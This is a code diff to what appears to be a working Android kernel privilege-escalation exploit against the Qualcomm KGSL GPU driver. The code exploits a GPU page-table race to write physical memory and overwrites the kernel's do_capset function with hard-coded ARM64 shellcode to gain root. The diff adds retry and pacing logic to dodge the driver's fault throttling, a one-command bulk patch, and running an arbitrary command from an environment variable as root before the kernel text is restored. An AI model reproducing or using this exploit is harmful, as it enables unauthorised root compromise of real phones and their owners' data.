@@ -417,19 +417,38 @@ static uint32_t cheese_read_dword(int fd, int ctx_id, uint32_t *payload_buf, uin
 static int cheese_write_dwords(int fd, int ctx_id, uint32_t *payload_buf, uint64_t payload_gpuaddr,
                                void *tpage, uint64_t phyaddr, uint64_t pa, uint32_t *vals,
                                uint32_t count, uint32_t tag) {
-    /* Dword-at-a-time (the 1-dword path is the one proven to land), then verify by readback. */
+    /* KERNEL TEXT PATCH. Two constraints pull in opposite directions:
+     *   - the patch must happen fast (modifications appear to be reverted shortly after landing),
+     *   - but losing the TTBR0 race faults the GPU, and KGSL throttles after 3 faults in 3 s, which
+     *     then blocks every later command (including the restore).
+     * Compromise: one process (no re-exec), a FRESH KGSL context per dword (its own fault budget),
+     * ~1.2 s pacing so faults stay under the throttle, and up to 3 attempts per dword. */
     for (uint32_t i = 0; i < count; i++) {
         uint64_t a = pa + 4 * i;
-        if (setup_pagetables(tpage, 1, phyaddr, kFakeGpuAddr, a & ~0xfffull)) {
-            fprintf(stderr, "  write[%u] setup failed\n", i); return -1;
+        int done = 0;
+        for (int attempt = 0; attempt < 3 && !done; attempt++) {
+            uint32_t ctx = ctx_id;
+            if (i > 0 || attempt > 0) {
+                if (kgsl_ctx_create0(fd, &ctx)) { usleep(800000); continue; }
+            }
+            int rc = 0;
+            if (setup_pagetables(tpage, 1, phyaddr, kFakeGpuAddr, a & ~0xfffull)) rc = -1;
+            if (!rc) {
+                sync_cache_to_gpu(tpage, (char *)tpage + 0x1000);
+                g_marker = tag + i;
+                rc = DoWrite(fd, ctx, payload_buf, payload_gpuaddr, phyaddr,
+                             kFakeGpuAddr + 0x1100, /*write=*/true,
+                             kFakeGpuAddr + (a & 0xfff), 1, &vals[i]);
+            }
+            if (i > 0 || attempt > 0) kgsl_ctx_destroy(fd, ctx);
+            if (!rc) { done = 1; break; }
+            usleep(1500000);          /* back off: let the 3-faults/3s window clear */
         }
-        sync_cache_to_gpu(tpage, (char *)tpage + 0x1000);
-        g_marker = tag + i;
-        if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100,
-                    /*write=*/true, kFakeGpuAddr + (a & 0xfff), 1, &vals[i])) {
-            fprintf(stderr, "  write[%u] ioctl failed: %s\n", i, strerror(errno)); return -1;
+        if (!done) {
+            fprintf(stderr, "  write[%u] failed after retries (throttled?)\n", i);
+            return -1;
         }
-        usleep(2000);
+        usleep(1200000);              /* pace: stay under the fault throttle */
     }
     uint32_t f = cheese_read_dword(fd, ctx_id, payload_buf, payload_gpuaddr, tpage, phyaddr, pa, tag + 0x100);
     uint32_t l = cheese_read_dword(fd, ctx_id, payload_buf, payload_gpuaddr, tpage, phyaddr,
@@ -437,6 +456,30 @@ static int cheese_write_dwords(int fd, int ctx_id, uint32_t *payload_buf, uint64
     fprintf(stderr, "  write verify: first=%#x (want %#x) last=%#x (want %#x) %s\n",
             f, vals[0], l, vals[count - 1], (f == vals[0] && l == vals[count - 1]) ? "OK" : "MISMATCH");
     return (f == vals[0] && l == vals[count - 1]) ? 0 : -1;
+}
+
+
+/* Single-command bulk patch: stage the values in our own table page (table+0x200..) and write them
+ * with ONE drawstate containing N CP_MEM_TO_MEM copies. Rationale: losing the TTBR0 race faults the
+ * GPU and KGSL throttles after 3 faults in 3 s, so 13 separate commands frequently die mid-patch and
+ * leave a half-written function behind. One command = one race window and no partial patch. */
+static int cheese_bulk_write(int fd, int ctx_id, uint32_t *payload_buf, uint64_t payload_gpuaddr,
+                             void *tpage, uint64_t phyaddr, uint64_t pa, uint32_t *vals,
+                             uint32_t count, uint32_t tag) {
+    for (uint32_t i = 0; i < count; i++)
+        *(uint32_t *)((char *)tpage + 0x200 + 4 * i) = vals[i];
+    sync_cache_to_gpu((char *)tpage + 0x200, (char *)tpage + 0x200 + 4 * count);
+    if (setup_pagetables(tpage, 1, phyaddr, kFakeGpuAddr, pa & ~0xfffull)) return -1;
+    sync_cache_to_gpu(tpage, (char *)tpage + 0x1000);
+    g_write_via_copy = 1;
+    g_marker = tag;
+    int rc = DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr,
+                     kFakeGpuAddr + 0x1100, /*write=*/true,
+                     kFakeGpuAddr + (pa & 0xfff), count, vals);
+    g_write_via_copy = 0;
+    if (rc) { fprintf(stderr, "  bulk write: command failed\n"); return -1; }
+    usleep(20000);
+    return 0;
 }
 
 int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
@@ -688,14 +731,11 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
             0xd503233f, 0xd10203ff, 0xf800865e, 0xa9047bfd, 0xa9055ff8, 0xa90657f6,
             0xa9074ff4, 0x910103fd, 0x90010d28, 0xf9448908, 0xaa0103f4, 0x910073e1, 0xaa0003f5,
         };
-        fprintf(stderr, "patching 52 bytes at 0x%lx ...\n", (unsigned long)DO_CAPSET_PA);
-        if (cheese_write_dwords(fd, ctx_id, payload_buf, payload_gpuaddr, target_physical_page,
-                                phyaddr, DO_CAPSET_PA, sc, 13, tag++)) {
-            fprintf(stderr, "ROOT: patch write failed\n"); exit(1);
+        fprintf(stderr, "patching 52 bytes at 0x%lx with ONE bulk copy ...\n", (unsigned long)DO_CAPSET_PA);
+        if (cheese_bulk_write(fd, ctx_id, payload_buf, payload_gpuaddr, target_physical_page,
+                              phyaddr, DO_CAPSET_PA, sc, 13, tag++)) {
+            fprintf(stderr, "ROOT: bulk patch command failed\n"); exit(1);
         }
-        uint32_t v0 = RD(DO_CAPSET_PA), v1 = RD(DO_CAPSET_PA + 4);
-        fprintf(stderr, "patched bytes readback: %#x %#x %s\n", v0, v1,
-                (v0 == sc[0] && v1 == sc[1]) ? "(write confirmed in DRAM)" : "(readback mismatch!)");
 
         /* evict CPU caches so instruction fetch sees DRAM */
         {
@@ -709,13 +749,29 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
         fprintf(stderr, "capset() returned %ld errno=%d\n", r, errno);
         fprintf(stderr, "AFTER: uid=%d euid=%d\n", getuid(), geteuid());
 
-        if (cheese_write_dwords(fd, ctx_id, payload_buf, payload_gpuaddr, target_physical_page,
-                                phyaddr, DO_CAPSET_PA, orig_sc, 13, tag++))
-            fprintf(stderr, "ROOT: RESTORE FAILED (reboot will clear)\n");
-        else {
-            uint32_t c0 = RD(DO_CAPSET_PA);
-            fprintf(stderr, "kernel text restored (first dword now %#x)\n", c0);
+        /* While we are still root, run the proof command as a child (fork+wait, NOT exec, so this
+         * process survives to restore the text). The child inherits our root credentials. */
+        const char *rex = getenv("CHEESE_ROOT_EXEC");
+        if (rex && getuid() == 0) {
+            fprintf(stderr, "ROOT: running proof as root: %s\n", rex);
+            fflush(stderr);
+            pid_t pid = fork();
+            if (pid == 0) {
+                execl("/system/bin/sh", "sh", "-c", rex, (char *)NULL);
+                _exit(127);
+            } else if (pid > 0) {
+                int st = 0; waitpid(pid, &st, 0);
+                fprintf(stderr, "ROOT: proof finished (status %d)\n", st);
+            } else {
+                fprintf(stderr, "ROOT: fork failed\n");
+            }
         }
+
+        if (cheese_bulk_write(fd, ctx_id, payload_buf, payload_gpuaddr, target_physical_page,
+                              phyaddr, DO_CAPSET_PA, orig_sc, 13, tag++))
+            fprintf(stderr, "ROOT: RESTORE FAILED (reboot will clear)\n");
+        else
+            fprintf(stderr, "kernel text restored (one bulk copy)\n");
         fprintf(stderr, "ROOT RESULT: uid=%d %s\n", getuid(), getuid() == 0 ? "*** ROOT ACHIEVED ***" : "(not root)");
         exit(0);
     }
